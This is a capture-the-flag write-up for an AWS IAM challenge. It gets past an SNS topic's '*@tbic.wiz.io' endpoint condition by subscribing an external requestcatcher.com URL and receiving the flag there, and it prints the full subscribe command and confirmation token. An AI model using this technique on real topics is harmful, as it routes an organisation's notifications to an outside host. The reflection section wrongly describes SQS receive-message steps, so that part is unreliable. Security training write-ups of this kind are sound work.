# Challenge number
Challenge: 3

## Challenge Statement
In this challenge, I was tasked with subscribing to an SNS topic and confirming the subscription. The IAM policy provided in the challenge allowed me to subscribe to the TBICWizPushNotifications SNS topic if the endpoint matched the specified condition *@tbic.wiz.io. My goal was to subscribe using a valid endpoint and confirm the subscription to receive notifications.

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
**What do I have access to?**
The IAM policy allows public access for subscribing to the SNS topic with the SNS:Subscribe action. The policy specifies that anyone can subscribe, but only endpoints with the domain @tbic.wiz.io are permitted through the condition sns:Endpoint. This means anyone can interact with the topic as long as the provided endpoint meets the specified condition.

**What don't I have access to?**
While I have the permission to subscribe, I do not have access to perform any other administrative tasks related to the SNS topic. This includes actions such as publishing messages to the topic, modifying the topic's settings, or removing subscriptions. The policy grants permission for subscribing but doesn't provide broader control over the SNS topic itself.

**What do I find interesting?**
The policy's allowance for any principal (i.e., anyone) to subscribe, as long as the endpoint matches @tbic.wiz.io, is intriguing because it balances openness with a condition. While this might seem like a flexible setup, the openness of AWS: * raises concerns, as anyone could exploit this by creating an endpoint matching the condition. It’s an interesting design choice, but it could lead to unintended exposure of the service.

**What could an attacker do with this access?**
An attacker could potentially abuse this access by subscribing a malicious endpoint that matches the @tbic.wiz.io condition. Once subscribed, the attacker could receive sensitive notifications or data sent to the topic. Since there is no further control on the subscription beyond the endpoint condition, attackers could gather confidential information or trigger unintended actions if the topic sends alerts or triggers workflows upon new messages.
  
**How could this misconfiguration have been avoided?**
This misconfiguration could have been avoided by tightening the permissions around who is allowed to subscribe to the SNS topic. Instead of allowing open access with AWS: *, a more secure setup would restrict access to specific, trusted AWS identities (IAM roles or users). Furthermore, a more granular condition, such as IP address restrictions or more specific endpoint checks, could be applied. Additionally, confirming subscriptions only from known, trusted endpoints would help avoid malicious subscriptions.


## Solution
**Step-1: Capture the Flag Using Requestcatcher**
To begin the process, I used Requestcatcher to create a temporary endpoint to subscribe to the SNS topic. This would allow me to receive the messages sent by the SNS topic.
```
https://requestcatcher.com/
```
**Step-2: Subscribe to the SNS Topic**
To subscribe to the SNS topic, I used the aws sns subscribe command, specifying the topic ARN and the endpoint that matches the required condition (@tbic.wiz.io).
```
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint 'https://ashish.requestcatcher.com/test@tbic.wiz.io'
```

**Step 3: Confirm the Subscription**
After subscribing, SNS sent a confirmation message to the provided endpoint. To confirm the subscription, I accessed the confirmation link provided in the message. The URL included a Token parameter that I used to confirm the subscription.
```
https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5872376d572991ca2da28f73768f1d8b95ea0f71895f216143f2f1037cc2ea5795e8b34921442cff336606b3cb79056939a430c18dea0854ec15350ecd88fda926cac07c59061146a0af550e5fab5d7e0a4c29d2cf5ddcc7ded4c8b33b5f2ad181ec8f386ad8e71e01227dbb98985917a9

```
Once I clicked the confirmation link, the subscription was confirmed, and I was able to receive notifications from the SNS topic.

**Step 4: Receive the Message**
After confirming the subscription, I started receiving messages from the SNS topic. These messages contained the relevant information, including the flag or other useful data, which I could then extract for further use.
```
flag: {wiz:always-suspect-asterisks}
```
Step 5: Submit the Flag: Finally, I submitted the retrieved flag on the challenge platform.

## Reflection
**What was your approach?**
My approach involved understanding the specific condition in the IAM policy, which restricted access to endpoints ending with @tbic.wiz.io. Once I understood that, I focused on subscribing to the SNS topic with the correct endpoint and confirmed my subscription before proceeding with the rest of the process.
  
**What was the biggest challenge?**
The biggest challenge was ensuring my endpoint matched the condition specified in the IAM policy (@tbic.wiz.io). Once that was clear, I followed the SNS subscription and confirmation steps carefully.
  
**How did you overcome the challenges?**
I overcame this challenge by reviewing the IAM policy to understand the condition and selecting an appropriate endpoint. Using the AWS CLI, I tested different commands to confirm I had the correct permissions to subscribe to the SNS topic and receive messages.
  
**What led to the break through?**
The breakthrough came when I successfully executed the receive-message command, which allowed me to pull messages from the queue. I then found the message containing the flag, marking the success of the process.
  
**On the blue side, how can the learning be used to properly defend the important assets?**
This experience reinforced the importance of the principle of least privilege. To protect critical assets, like SQS queues, organizations should avoid granting overly broad permissions and restrict access to only trusted users or services. Regular audits and reviews of IAM policies help minimize the risk of unauthorized access and prevent security vulnerabilities.
